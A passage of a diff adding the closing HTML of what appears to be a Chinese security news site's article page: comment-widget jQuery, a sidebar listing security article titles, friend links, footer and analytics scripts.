+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
